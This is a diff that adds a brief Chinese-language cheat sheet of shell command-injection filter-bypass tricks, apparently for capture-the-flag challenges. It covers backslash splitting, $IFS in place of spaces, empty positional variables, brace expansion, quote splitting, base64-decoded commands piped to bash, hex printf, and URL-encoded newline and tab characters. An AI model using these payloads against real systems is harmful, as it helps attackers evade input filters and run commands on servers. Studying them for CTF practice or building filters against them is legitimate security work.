@@ -1,0 +1,36 @@
+使用反斜杠
+w\ho\am\i
+
+空格绕过
+使用<和>
+cat<>flag
+cat<1.sh 
+使用特殊变量:$IFS
+cat$IFS\flag
+cat${IFS}flag
+
+
+使用特殊变量${9}
+${9}对应空字符串关键字过滤绕过，使用$*和$@，$x(x代表1-9),${x}(x>=10)
+ca$*t  flag
+ca$@t flag
+ca$2t flag
+ca${11} flag
+
+
+花括号还有一种用法：{command,argument}
+{cat,flag}
+
+
+使用双引号和单引号
+ca"t" 1.sh
+ca't' 1.sh
+
+使用base64
+echo 'Y2F0IC4vZmxhZwo=' |base64 -d |bash
+
+使用进制
+$(printf '\x00\x00\x00\x00\x00')
+使用%0a(\n)，%0d(\r)，%09(\t)等字符也可以bypass
+
+
